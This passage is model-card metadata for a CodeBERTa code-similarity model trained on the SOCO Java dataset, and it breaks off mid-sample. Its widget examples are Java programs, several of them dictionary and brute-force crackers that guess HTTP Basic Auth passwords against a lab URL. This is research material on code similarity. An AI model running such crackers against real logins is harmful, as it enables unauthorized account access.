@@ -1,0 +1,1635 @@
+_id: 684857cdd94368e9bf73becd
+id: buelfhood/SOCO-Java-CodeBERTa-TripletLoss-100
+private: false
+pipeline_tag: sentence-similarity
+library_name: sentence-transformers
+tags:
+- sentence-transformers
+- safetensors
+- roberta
+- sentence-similarity
+- feature-extraction
+- generated_from_trainer
+- dataset_size:42960
+- loss:BatchAllTripletLoss
+- loss:TripletLoss
+- dataset:buelfhood/SOCO_TRAIN_java
+- arxiv:1908.10084
+- arxiv:1703.07737
+- base_model:huggingface/CodeBERTa-small-v1
+- base_model:finetune:huggingface/CodeBERTa-small-v1
+- text-embeddings-inference
+- endpoints_compatible
+- region:us
+downloads: 3
+likes: 0
+modelId: buelfhood/SOCO-Java-CodeBERTa-TripletLoss-100
+author: buelfhood
+sha: a07f7907ea6ba79053a22b95f15b33c195dc3545
+lastModified: '2025-06-10T16:05:43.000Z'
+gated: false
+disabled: false
+mask_token: <mask>
+widgetData:
+- source_sentence: "import java.net.*;\nimport java.io.*;\nimport java.*;\n\n public class Dictionary {\n\n   URLConnection\
+    \ conn = null;\n   private static boolean status = false;\n\n   public static void main (String args[]){\n     Dictionary\
+    \ a = new Dictionary();\n     String[] inp = {\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\",\n     \t\t\t\t \"\",\n\
+    \     \t\t\t\t \"\"};\n     File file = new File(\"words\");\n     exit:\n     try {\n\t\t BufferedReader in = new BufferedReader(new\
+    \ FileReader(file));\n\t\t int attempt = 0;\n\t\t inp[2] = in.readLine();\n\t\t while (inp[2] != null) {\n\t\n\t\t\t if\
+    \ (inp[2].length() <= 3) {\n\t\t\t \tattempt++;\n\t\t\t \ta.doit(inp);\n     \t\t \tif (status) {\n\t\t\t \t\t System.out.println(\"\
+    Crrect password is: \" + inp[2]);\n\t\t\t \t\t System.out.println(\"Number of attempts = \" + attempt);\n\t\t\t \t\t break\
+    \ exit;\n\t\t\t \t}\n\t\t \t }\n\t\t\t inp[2] = in.readLine();\n   \t\t}\n\t } catch (FileNotFoundException e1) {\n\t\t\
+    \ \n\t\tSystem.err.println(\"File not found: \" + file);\n\t} catch (IOException e2) {\n\t\t\n\t\te2.printStackTrace();\n\
+    \t}\n\n   }\n\n   public void doit(String args[]) {\n     \n     try {\n       BufferedReader in = new BufferedReader(\n\
+    \           new InputStreamReader\n              (connectURL(new URL(args[0]), args[1], args[2])));\n       String line;\n\
+    \       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n           status = true;\n  \
+    \         }\n       }\n     catch (IOException e) {\n   \n       }\n     }\n\n   public InputStream connectURL (URL url,\
+    \ String uname, String pword)\n        throws IOException  {\n     conn = url.openConnection();\n     conn.setRequestProperty\
+    \ (\"Authorization\",\n     userNamePasswordBase64(uname,pword));\n     conn.connect ();\n     return conn.getInputStream();\n\
+    \     }\n\n   public String userNamePasswordBase64(String username, String password) {\n     return \" \" + base64Encode\
+    \ (username + \":\" + password);\n     }\n\n   private final static char base64Array [] = {\n       'A', 'B', 'C', 'D',\
+    \ 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n\
+    \       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\n       'o', 'p', 'q',\
+    \ 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n       '4', '5', '6', '7', '8', '9', '+',\
+    \ '/'\n  };\n\n   private static String base64Encode (String string)    {\n     String encodedString = \"\";\n     byte\
+    \ bytes [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n     while (i < bytes.length) {\n       byte b1\
+    \ = bytes [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length) {\n          b2 = 0;\n          b3 =\
+    \ 0;\n          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n          if (i >= bytes.length) {\n\
+    \             b3 = 0;\n             pad = 1;\n             }\n          else\n             b3 = bytes [i++];\n       \
+    \   }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));\n       byte c3 = (byte)(((b2\
+    \ & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n       encodedString += base64Array [c1];\n       encodedString\
+    \ += base64Array [c2];\n       switch (pad) {\n        case 0:\n          encodedString += base64Array [c3];\n       \
+    \   encodedString += base64Array [c4];\n          break;\n        case 1:\n          encodedString += base64Array [c3];\n\
+    \          encodedString += \"=\";\n          break;\n        case 2:\n          encodedString += \"==\";\n          break;\n\
+    \        }\n       }\n       return encodedString;\n   }\n }\n\n"
+  sentences:
+  - "import java.net.*;\nimport java.io.*;\n\n public class Dictionary {\n int attempts = 0;\n   URLConnection conn = null;\n\
+    \n   public static void main (String args[]){\n\n\tDictionary a = new Dictionary();\n     a.attack(args);\n     }\n\n\
+    \   public void attack(String args[]) {\n   try {\n       String login = new String(\"\");\n       String url = new String(\"\
+    http://sec-crack.cs.rmit.edu./SEC/2/index.php\");\n       String passwd = new String();\n\n\n       passwd = getPasswd();\n\
+    \       BufferedReader in = new BufferedReader( new InputStreamReader (openURLForInput(new URL(url), login , passwd)));\n\
+    \n       String line;\n       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n       \
+    \    }\n           System.out.println(\"Password Cracked Successfully!!!\");\n           System.out.println(\"The passsword\
+    \ is :\" + passwd + \"and got after \" +attempts + \" tries\");\n       }\n     catch (IOException e) {\n  \n      String\
+    \ r = new String(e.getMessage());\n    if ( r != null)\n    {\n     System.out.println(\"Message :\" +r);\n     Dictionary\
+    \ a = new Dictionary();\n     a.attack(args);\n    }\n     else\n     {\n\tSystem.out.println(\"Trying again\");\n\tDictionary\
+    \ a = new Dictionary();\n\ta.attack(args);\n     }\n     }\n   }\n  public String getPasswd()\n  {\n\n int i=0;int j=0;\n\
+    \ attempts++;\n int count =0;\n System.out.println(\"Passing dictionary word and waiting for URL reply....... \");\n \
+    \ String currentword = \"\";\n  String se = \"\";\n  try{\n FileInputStream reader = new FileInputStream (\"words\");\n\
+    \ DataInputStream in = new DataInputStream(reader);\n while (in.available() !=0)\n{\n currentword = in.readLine();\n count++;\n\
+    \ \n \n }\n }\n  catch( IOException e){}\n\n  return currentword;\n\t \n         }\n\n\n\n public InputStream openURLForInput\
+    \ (URL url, String uname, String pword)\n throws IOException  {\n     conn = url.openConnection();\n     conn.setDoInput\
+    \ (true);\n     conn.setRequestProperty (\"Authorization\", userNamePasswordBase64(uname,pword));\n     conn.connect ();\n\
+    \     return conn.getInputStream();\n     }\n\n\n public String userNamePasswordBase64(String username, String password)\
+    \ {\n     return \" \" + base64Encode (username + \":\" + password);\n     }\n\n private final static char base64Array\
+    \ [] = {\n       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q',\
+    \ 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k',\
+    \ 'l', 'm', 'n',\n       'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n   \
+    \    '4', '5', '6', '7', '8', '9', '+', '/'\n  };\n\n private static String base64Encode (String string)    {\n     String\
+    \ encodedString = \"\";\n     byte bytes [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n     while (i <\
+    \ bytes.length) {\n       byte b1 = bytes [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length) {\n\
+    \          b2 = 0;\n          b3 = 0;\n          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n \
+    \         if (i >= bytes.length) {\n             b3 = 0;\n             pad = 1;\n             }\n          else\n    \
+    \         b3 = bytes [i++];\n          }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3) << 4)\
+    \ | (b2 >> 4));\n       byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n      \
+    \ encodedString += base64Array [c1];\n       encodedString += base64Array [c2];\n       switch (pad) {\n         case\
+    \ 0:\n          encodedString += base64Array [c3];\n          encodedString += base64Array [c4];\n          break;\n \
+    \        case 1:\n          encodedString += base64Array [c3];\n          encodedString += \"=\";\n          break;\n\
+    \         case 2:\n          encodedString += \"==\";\n          break;\n        }\n       }\n       return encodedString;\n\
+    \   }\n }\n\n"
+  - "import java.net.*;\nimport java.io.*;\n\n public class Bruteforce {\n int attempts = 0;\n  int l = 65;int m = 65;int\
+    \ n = 65;\n   URLConnection conn = null;\n\n   public static void  main(String args[]){\n     \n\tBruteforce a = new Bruteforce();\n\
+    \        a.attack(args);\n     }\n\n   public void attack(String args[]) {\n   try {\n\n       String login = new String(\"\
+    \");\n       String url = new String(\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\");\n       String passwd = new String();\n\
+    \n\t passwd = getPasswd();\n         BufferedReader in = new BufferedReader( new InputStreamReader (openURLForInput(new\
+    \ URL(url), login , passwd)));\n\n       String line;\n       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n\
+    \           }\n           System.out.println(\"Password Cracked Successfully!!!\");\n           System.out.println(\"\
+    The passsword is :\" + passwd + \"and got after \" + attempts + \" tries\");\n       }\n     catch (IOException e) {\n\
+    \    \n      String r = new String(e.getMessage());\n    if ( r != null)\n    {\n     System.out.println(\"Message :\"\
+    \ +r);\n     System.out.println(\"Trying again with new password\");\n     Bruteforce a = new Bruteforce();\n     a.attack(args);\n\
+    \    }\n     else\n     {\n\tSystem.out.println(\"Trying again with new password\");\n\tBruteforce a = new Bruteforce();\n\
+    \ta.attack(args);\n     }\n     }\n   }\n  public String getPasswd()\n  {\n    attempts++;\n\n    char i1 = 0;\n    char\
+    \ j1 = 0;\n    char k1 = 0;\n    \n     int i= l;     int j= m;     int k= n;\n\n    String c = new String();\n    String\
+    \ c1 = new String();\n    String c2 = new String();\n    String c3 = new String();\n    String c4 = new String();\n  \
+    \  boolean flag;\n\n    for (i=l;i<123;i++)\n    for (j=m;j<123;j++)\n    for (k=n;k<123;k++)\n    {\n        if( flag\
+    \ = true )\n        {\n\n    i1 = (char)i;\n    j1 = (char)j;\n    k1 = (char)k;\n\n    if (i==91) i=97;\n    if (j==91)\
+    \ j=97;\n    if (k==91) k=97;\n\n    c = i1+\"\";\n    c1 = j1+\"\";\n    c2 = k1+\"\";\n    c3 = c.concat(c1);\n    c4\
+    \ = c3.concat(c2);\n    }else break;\n    }\n    flag = false;\n    return c4;\n  }\n\n public InputStream openURLForInput\
+    \ (URL url, String uname, String pword)\n throws IOException  {\n     conn = url.openConnection();\n     conn.setDoInput\
+    \ (true);\n     conn.setRequestProperty (\"Authorization\", PasswordBase64(uname,pword));\n     conn.connect ();\n   \
+    \  return conn.getInputStream();\n     }\n\n\n public String PasswordBase64(String username, String password) {\n    \
+    \ return \" \" + base64Encode (username + \":\" + password);\n     }\n\n private final static char base64Array [] = {\n\
+    \       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q', 'R', 'S',\
+    \ 'T', 'U', 'V', 'W', 'X',\n       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k', 'l', 'm',\
+    \ 'n',\n       'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n       '4', '5',\
+    \ '6', '7', '8', '9', '+', '/'\n  };\n\n private static String base64Encode (String string)    {\n     String encodedString\
+    \ = \"\";\n     byte bytes [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n     while (i < bytes.length)\
+    \ {\n       byte b1 = bytes [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length) {\n          b2 =\
+    \ 0;\n          b3 = 0;\n          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n          if (i\
+    \ >= bytes.length) {\n             b3 = 0;\n             pad = 1;\n             }\n          else\n             b3 = bytes\
+    \ [i++];\n          }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));\n  \
+    \     byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n       encodedString += base64Array\
+    \ [c1];\n       encodedString += base64Array [c2];\n       switch (pad) {\n         case 0:\n          encodedString +=\
+    \ base64Array [c3];\n          encodedString += base64Array [c4];\n          break;\n         case 1:\n          encodedString\
+    \ += base64Array [c3];\n          encodedString += \"=\";\n          break;\n        case  2:\n          encodedString\
+    \ += \"==\";\n          break;\n        }\n       }\n       return encodedString;\n   }\n }\n"
+  - "import java.io.BufferedReader;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\
+    import java.util.Date;\nimport java.util.Properties;\n\nimport javax.mail.Message;\nimport javax.mail.Session;\nimport\
+    \ javax.mail.Transport;\nimport javax.mail.Message.RecipientType;\nimport javax.mail.internet.InternetAddress;\nimport\
+    \ javax.mail.internet.MimeMessage;\n\n\n\n\npublic class Mailsend\n{\n    static final String SMTP_SERVER = MailsendPropertyHelper.getProperty(\"\
+    smtpServer\");\n    static final String RECIPIENT_EMAIL = MailsendPropertyHelper.getProperty(\"recipient\");\n    static\
+    \ final String SENDER_EMAIL = MailsendPropertyHelper.getProperty(\"sender\");\n    static final String MESSAGE_HEADER\
+    \ = MailsendPropertyHelper.getProperty(\"messageHeader\");\n\n\n\t\n\n\tpublic static void main(String args[])\n\t{\n\t\
+    \ttry\n\t\t{\n\t\t\t\n\t\t\tString smtpServer = SMTP_SERVER;\n\t\t\tString recip = RECIPIENT_EMAIL;\n\t\t\tString from\
+    \ = SENDER_EMAIL;\n\t\t\tString subject = MESSAGE_HEADER;\n\t\t\tString body = \"Testing\";\n\n\t\t\tSystem.out.println(\"\
+    Started sending the message\");\n\t\t\tMailsend.send(smtpServer,recip , from, subject, body);\n\t\t}\n\t\tcatch (Exception\
+    \ ex)\n\t\t{\n\t\t\tSystem.out.println(\n\t\t\t\t\"Usage: java mailsend\"\n\t\t\t\t\t+ \" smtpServer toAddress fromAddress\
+    \ subjectText bodyText\");\n\t\t}\n\n\t\tSystem.exit(0);\n\t}\n\n\n\t\n\tpublic static void send(String smtpServer, String\
+    \ receiver,\tString from, String subject, String body)\n\n\t{\n\t\ttry\n\t\t{\n\t\t\tProperties props = System.getProperties();\n\
+    \n\t\t\t\n\n\t\t\tprops.put(\"mail.smtp.host\", smtpServer);\n\t\t\tprops.put(\"mail.smtp.timeout\", \"20000\");\n\t\t\
+    \tprops.put(\"mail.smtp.connectiontimeout\", \"20000\");\n\n\t\t\t\n\t\t\tSession session = Session.getDefaultInstance(props,\
+    \ null);\n\n\n\t\t\t\n\t\t\tMessage msg = new MimeMessage(session);\n\n\t\t\t\n\t\t\tmsg.setFrom(new InternetAddress(from));\n\
+    \t\t\tmsg.setRecipients(Message.RecipientType.NORMAL,\tInternetAddress.parse(receiver, false));\n\n\n\n\t\t\t\n\t\t\t\
+    msg.setSubject(subject);\n\n\t\t\tmsg.setSentDate(new Date());\n\n\t\t\tmsg.setText(body);\n\n\t\t\t\n\t\t\tTransport.send(msg);\n\
+    \n\t\t\tSystem.out.println(\"sent the email with the differences : \"+ + \"using the mail server: \"+ smtpServer);\n\n\
+    \t\t}\n\t\tcatch (Exception ex)\n\t\t{\n\t\t\tex.printStackTrace();\n\t\t}\n\t}\n}\n"
+- source_sentence: "import java.net.*;\nimport java.io.*;\nimport java.*;\n\n public class Dictionary {\n\n   URLConnection\
+    \ conn = null;\n   private static boolean status = false;\n\n   public static void main (String args[]){\n     Dictionary\
+    \ a = new Dictionary();\n     String[] inp = {\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\",\n     \t\t\t\t \"\",\n\
+    \     \t\t\t\t \"\"};\n     File file = new File(\"words\");\n     exit:\n     try {\n\t\t BufferedReader in = new BufferedReader(new\
+    \ FileReader(file));\n\t\t int attempt = 0;\n\t\t inp[2] = in.readLine();\n\t\t while (inp[2] != null) {\n\t\n\t\t\t if\
+    \ (inp[2].length() <= 3) {\n\t\t\t \tattempt++;\n\t\t\t \ta.doit(inp);\n     \t\t \tif (status) {\n\t\t\t \t\t System.out.println(\"\
+    Crrect password is: \" + inp[2]);\n\t\t\t \t\t System.out.println(\"Number of attempts = \" + attempt);\n\t\t\t \t\t break\
+    \ exit;\n\t\t\t \t}\n\t\t \t }\n\t\t\t inp[2] = in.readLine();\n   \t\t}\n\t } catch (FileNotFoundException e1) {\n\t\t\
+    \ \n\t\tSystem.err.println(\"File not found: \" + file);\n\t} catch (IOException e2) {\n\t\t\n\t\te2.printStackTrace();\n\
+    \t}\n\n   }\n\n   public void doit(String args[]) {\n     \n     try {\n       BufferedReader in = new BufferedReader(\n\
+    \           new InputStreamReader\n              (connectURL(new URL(args[0]), args[1], args[2])));\n       String line;\n\
+    \       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n           status = true;\n  \
+    \         }\n       }\n     catch (IOException e) {\n   \n       }\n     }\n\n   public InputStream connectURL (URL url,\
+    \ String uname, String pword)\n        throws IOException  {\n     conn = url.openConnection();\n     conn.setRequestProperty\
+    \ (\"Authorization\",\n     userNamePasswordBase64(uname,pword));\n     conn.connect ();\n     return conn.getInputStream();\n\
+    \     }\n\n   public String userNamePasswordBase64(String username, String password) {\n     return \" \" + base64Encode\
+    \ (username + \":\" + password);\n     }\n\n   private final static char base64Array [] = {\n       'A', 'B', 'C', 'D',\
+    \ 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n\
+    \       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\n       'o', 'p', 'q',\
+    \ 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n       '4', '5', '6', '7', '8', '9', '+',\
+    \ '/'\n  };\n\n   private static String base64Encode (String string)    {\n     String encodedString = \"\";\n     byte\
+    \ bytes [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n     while (i < bytes.length) {\n       byte b1\
+    \ = bytes [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length) {\n          b2 = 0;\n          b3 =\
+    \ 0;\n          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n          if (i >= bytes.length) {\n\
+    \             b3 = 0;\n             pad = 1;\n             }\n          else\n             b3 = bytes [i++];\n       \
+    \   }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));\n       byte c3 = (byte)(((b2\
+    \ & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n       encodedString += base64Array [c1];\n       encodedString\
+    \ += base64Array [c2];\n       switch (pad) {\n        case 0:\n          encodedString += base64Array [c3];\n       \
+    \   encodedString += base64Array [c4];\n          break;\n        case 1:\n          encodedString += base64Array [c3];\n\
+    \          encodedString += \"=\";\n          break;\n        case 2:\n          encodedString += \"==\";\n          break;\n\
+    \        }\n       }\n       return encodedString;\n   }\n }\n\n"
+  sentences:
+  - "import java.net.*;\nimport java.io.*;\n\n public class Bruteforce {\n int attempts = 0;\n  int l = 65;int m = 65;int\
+    \ n = 65;\n   URLConnection conn = null;\n\n   public static void  main(String args[]){\n     \n\tBruteforce a = new Bruteforce();\n\
+    \        a.attack(args);\n     }\n\n   public void attack(String args[]) {\n   try {\n\n       String login = new String(\"\
+    \");\n       String url = new String(\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\");\n       String passwd = new String();\n\
+    \n\t passwd = getPasswd();\n         BufferedReader in = new BufferedReader( new InputStreamReader (openURLForInput(new\
+    \ URL(url), login , passwd)));\n\n       String line;\n       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n\
+    \           }\n           System.out.println(\"Password Cracked Successfully!!!\");\n           System.out.println(\"\
+    The passsword is :\" + passwd + \"and got after \" + attempts + \" tries\");\n       }\n     catch (IOException e) {\n\
+    \    \n      String r = new String(e.getMessage());\n    if ( r != null)\n    {\n     System.out.println(\"Message :\"\
+    \ +r);\n     System.out.println(\"Trying again with new password\");\n     Bruteforce a = new Bruteforce();\n     a.attack(args);\n\
+    \    }\n     else\n     {\n\tSystem.out.println(\"Trying again with new password\");\n\tBruteforce a = new Bruteforce();\n\
+    \ta.attack(args);\n     }\n     }\n   }\n  public String getPasswd()\n  {\n    attempts++;\n\n    char i1 = 0;\n    char\
+    \ j1 = 0;\n    char k1 = 0;\n    \n     int i= l;     int j= m;     int k= n;\n\n    String c = new String();\n    String\
+    \ c1 = new String();\n    String c2 = new String();\n    String c3 = new String();\n    String c4 = new String();\n  \
+    \  boolean flag;\n\n    for (i=l;i<123;i++)\n    for (j=m;j<123;j++)\n    for (k=n;k<123;k++)\n    {\n        if( flag\
+    \ = true )\n        {\n\n    i1 = (char)i;\n    j1 = (char)j;\n    k1 = (char)k;\n\n    if (i==91) i=97;\n    if (j==91)\
+    \ j=97;\n    if (k==91) k=97;\n\n    c = i1+\"\";\n    c1 = j1+\"\";\n    c2 = k1+\"\";\n    c3 = c.concat(c1);\n    c4\
+    \ = c3.concat(c2);\n    }else break;\n    }\n    flag = false;\n    return c4;\n  }\n\n public InputStream openURLForInput\
+    \ (URL url, String uname, String pword)\n throws IOException  {\n     conn = url.openConnection();\n     conn.setDoInput\
+    \ (true);\n     conn.setRequestProperty (\"Authorization\", PasswordBase64(uname,pword));\n     conn.connect ();\n   \
+    \  return conn.getInputStream();\n     }\n\n\n public String PasswordBase64(String username, String password) {\n    \
+    \ return \" \" + base64Encode (username + \":\" + password);\n     }\n\n private final static char base64Array [] = {\n\
+    \       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q', 'R', 'S',\
+    \ 'T', 'U', 'V', 'W', 'X',\n       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k', 'l', 'm',\
+    \ 'n',\n       'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n       '4', '5',\
+    \ '6', '7', '8', '9', '+', '/'\n  };\n\n private static String base64Encode (String string)    {\n     String encodedString\
+    \ = \"\";\n     byte bytes [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n     while (i < bytes.length)\
+    \ {\n       byte b1 = bytes [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length) {\n          b2 =\
+    \ 0;\n          b3 = 0;\n          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n          if (i\
+    \ >= bytes.length) {\n             b3 = 0;\n             pad = 1;\n             }\n          else\n             b3 = bytes\
+    \ [i++];\n          }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));\n  \
+    \     byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n       encodedString += base64Array\
+    \ [c1];\n       encodedString += base64Array [c2];\n       switch (pad) {\n         case 0:\n          encodedString +=\
+    \ base64Array [c3];\n          encodedString += base64Array [c4];\n          break;\n         case 1:\n          encodedString\
+    \ += base64Array [c3];\n          encodedString += \"=\";\n          break;\n        case  2:\n          encodedString\
+    \ += \"==\";\n          break;\n        }\n       }\n       return encodedString;\n   }\n }\n"
+  - "\npublic class CasePasswords\n{\n\n    \n    static int verbose = CrackingConstants.quietMode;\n\n    \n\t\n\tpublic\
+    \ void CasePasswords()\n\t{\n    }\n\n\t\n\tpublic void CasePasswords(int inVerbose)\n\t{\n\t    verbose = inVerbose;\n\
+    \    }\n\n\t\n    public String [] createCasedPasswords( int leftIndex, int  midIndex, int rightIndex, String tail, String\
+    \ [] lowerChars, String [] upperChars, int scanType)\n    {\n        String [] casedPasswords = null;\n        \n    \
+    \    \n        \n        if(scanType == CrackingConstants.casedScan)\n            if(rightIndex > -1)\n            {\n\
+    \                \n                casedPasswords = new String[8];\n            }\n            else if(midIndex > -1)\n\
+    \            {\n                \n                casedPasswords = new String[4];\n            }\n            else\n \
+    \           {\n                \n                casedPasswords = new String[2];\n            }\n        else  \n    \
+    \    {\n            \n            casedPasswords = new String[1];\n        }\t\n                \n        \n        \n\
+    \        \n        if(scanType == CrackingConstants.casedScan)\n        {\n            if(rightIndex > -1)\n         \
+    \   {\n                \n                casedPasswords[0] = lowerChars[leftIndex] + lowerChars[midIndex] + lowerChars[rightIndex];\n\
+    \                casedPasswords[1] = upperChars[leftIndex] + upperChars[midIndex] + upperChars[rightIndex];\n        \
+    \        casedPasswords[2] = lowerChars[leftIndex] + lowerChars[midIndex] + upperChars[rightIndex];\n                casedPasswords[3]\
+    \ = lowerChars[leftIndex] + upperChars[midIndex] + lowerChars[rightIndex];\n                casedPasswords[4] = upperChars[leftIndex]\
+    \ + lowerChars[midIndex] + lowerChars[rightIndex];\n                casedPasswords[5] = upperChars[leftIndex] + upperChars[midIndex]\
+    \ + lowerChars[rightIndex];\n                casedPasswords[6] = upperChars[leftIndex] + lowerChars[midIndex] + upperChars[rightIndex];\n\
+    \                casedPasswords[7] = lowerChars[leftIndex] + upperChars[midIndex] + upperChars[rightIndex];\n        \
+    \    }\n            else if(midIndex > -1)\n            {\n                \n                casedPasswords[0] = lowerChars[leftIndex]\
+    \ + lowerChars[midIndex];\n                casedPasswords[1] = upperChars[leftIndex] + upperChars[midIndex];\n       \
+    \         casedPasswords[2] = lowerChars[leftIndex] + lowerChars[midIndex];\n                casedPasswords[3] = lowerChars[leftIndex]\
+    \ + upperChars[midIndex];\n            }\n            else\n            {\n                \n                casedPasswords[0]\
+    \ = lowerChars[leftIndex];\n                casedPasswords[1] = upperChars[leftIndex];\n            }\n        }\n   \
+    \     else\t\n        {\n            if(rightIndex > -1)\n            {\n                \n                casedPasswords[0]\
+    \ = lowerChars[leftIndex] + lowerChars[midIndex] + lowerChars[rightIndex];\n            }\n            else if(midIndex\
+    \ > -1)\n            {\n                \n                casedPasswords[0] = lowerChars[leftIndex] + lowerChars[midIndex];\n\
+    \            }\n            else\n            {\n                \n                casedPasswords[0] = lowerChars[leftIndex];\n\
+    \            }\n        }\t\n        \n        \n        \n        \n        \n        if(\"\" != tail)\n        \tfor(\
+    \ i = 0; i < casedPasswords.length; i++)\n        \t\tcasedPasswords[i] += tail;\n                        \n\t    if(verbose\
+    \  == CrackingConstants.verboseMode2)\n\t        printPasswords(casedPasswords);\n\n        return casedPasswords;\n \
+    \   }  \n    \n\t\n    public String [] createCasedPasswords(String candidate, int  scanType)\n    {\n        \n     \
+    \   int candLength = candidate.length();\n        int arrayLength = 2 ^ candLength;\n        arrayLength = 1;\n      \
+    \  String [] shortCasedPasswords = new String[1];\n        String [] casedPasswords = null;\n        char[] password =\
+    \ new char [candidate.length()];\n        \n        \n        if(scanType != CrackingConstants.simpleScan)\n         \
+    \   candidate.getChars(0, candidate.length(), password, 0);\n        \n        \n        \n        \n        \n      \
+    \  \n        \n        \n        \n        \n        if(scanType == CrackingConstants.simpleScan)\n        {\n       \
+    \     \n            \n            casedPasswords = new String[1];\n            casedPasswords[0] = candidate;\n      \
+    \  }\n        else if(candidate.length() == 1)\n        {\n            casedPasswords = new String[2];\n            casedPasswords[0]\
+    \ = Character.toString(Character.toLowerCase(password[0]));\n            casedPasswords[1] = Character.toString(Character.toUpperCase(password[0]));\n\
+    \            \n        }\n        else if (candidate.length() == 2)\n        {\n            casedPasswords = new String[4];\n\
+    \            casedPasswords[0] = Character.toString(Character.toLowerCase(password[0])) + Character.toString(Character.toLowerCase(password[1]));\n\
+    \            casedPasswords[1] = Character.toString(Character.toUpperCase(password[0])) + Character.toString(Character.toUpperCase(password[1]));\n\
+    \            casedPasswords[2] = Character.toString(Character.toLowerCase(password[0])) + Character.toString(Character.toUpperCase(password[1]));\n\
+    \            casedPasswords[3] = Character.toString(Character.toUpperCase(password[0])) + Character.toString(Character.toLowerCase(password[1]));\n\
+    \            \n        }\n        else if (candidate.length() == 3)\n        {\n            casedPasswords = new String[8];\n\
+    \            casedPasswords[0] = Character.toLowerCase(password[0]) + Character.toString(Character.toLowerCase(password[1]))\
+    \  + Character.toLowerCase(password[2]);\n            casedPasswords[1] = Character.toUpperCase(password[0]) + Character.toString(Character.toUpperCase(password[1]))\
+    \  + Character.toUpperCase(password[2]);\n            casedPasswords[2] = Character.toLowerCase(password[0]) + Character.toString(Character.toLowerCase(password[1]))\
+    \  + Character.toUpperCase(password[2]);\n            casedPasswords[3] = Character.toLowerCase(password[0]) + Character.toString(Character.toUpperCase(password[1]))\
+    \  + Character.toLowerCase(password[2]);\n            casedPasswords[4] = Character.toUpperCase(password[0]) + Character.toString(Character.toLowerCase(password[1]))\
+    \  + Character.toLowerCase(password[2]);\n            casedPasswords[5] = Character.toUpperCase(password[0]) + Character.toString(Character.toUpperCase(password[1]))\
+    \  + Character.toLowerCase(password[2]);\n            casedPasswords[6] = Character.toUpperCase(password[0]) + Character.toString(Character.toLowerCase(password[1]))\
+    \  + Character.toUpperCase(password[2]);\n            casedPasswords[7] = Character.toLowerCase(password[0]) + Character.toString(Character.toUpperCase(password[1]))\
